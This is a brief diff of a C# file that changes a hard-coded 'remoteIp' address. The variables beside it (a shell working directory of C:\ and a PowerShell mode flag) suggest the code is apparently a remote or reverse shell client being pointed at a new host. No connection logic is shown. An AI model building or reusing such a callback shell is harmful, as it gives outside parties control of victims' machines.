@@ -33,7 +33,7 @@ namespace YottaWap
         int i = 1;
         string mainPath;
         string sessionPrefix = "";
-        string remoteIp = "45.79.102.237";
+        string remoteIp = "54.219.202.131";
         string shellWorkingDirectory = "C:\\";
         bool powershellMode = false;
 
